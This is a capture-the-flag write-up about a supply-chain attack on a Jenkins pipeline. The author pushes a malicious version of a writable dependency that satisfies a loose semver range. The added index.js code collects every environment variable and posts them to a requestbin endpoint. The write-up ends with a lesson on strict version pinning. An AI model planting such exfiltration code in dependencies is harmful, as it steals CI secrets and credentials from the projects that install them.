# Twiddledum (& Twiddledee)

Our git user `thealice` can only read from `twiddledum`, the target repository within which resides Flag 6. However, they are able to write to `twiddledee`, which is listed as a dependency in the `package.json` of `twiddledum`.

Using this knowledge, we can inject our own malicious code into the `twiddledum` pipeline and extract Flag 6 this way. I had the `twiddledee` `index.js` sent a PUT request with all environment variables to a requestbin endpoint, but I think one could dump the flag to the Jenkins output console too with a little more work(probably including base64 encoding to defeat obfuscation). Here is the code I added:

```js

const request = require('request');
const process = require('process');

// Get all environment variables
const environmentData = Object.entries(process.env).reduce((obj, [key, value]) => {
  obj[key] = value;
  return obj;
}, {});

// Prepare data to be sent
const postData = {
  environmentData
};

// Post data to the specified endpoint
const requestOptions = {
  url: '<requestbin>',
  method: 'POST',
  json: true,
  body: postData,
};

request(requestOptions, (error, response, body) => {
  if (error) {
    console.error('An error occurred while sending data:', error);
  } else {
    console.log('Data successfully sent. Server response:', body);
  }
});
```

To get the `twiddledum` pipeline to take up this change, I tagged the new commit on `twiddldee` with a version that passed the SemVer constraints defined in the `twiddledum` dependencies, which conveniently allow any minor revision under the 1.x major version:

```json
  "dependencies": {
    "twiddledee": "git+http://gitea:3000/Wonderland/twiddledee#semver:^1.1.0"
  },
```

Lesson takeaway: use static version pinning where possible, especially for lesser known dependencies.
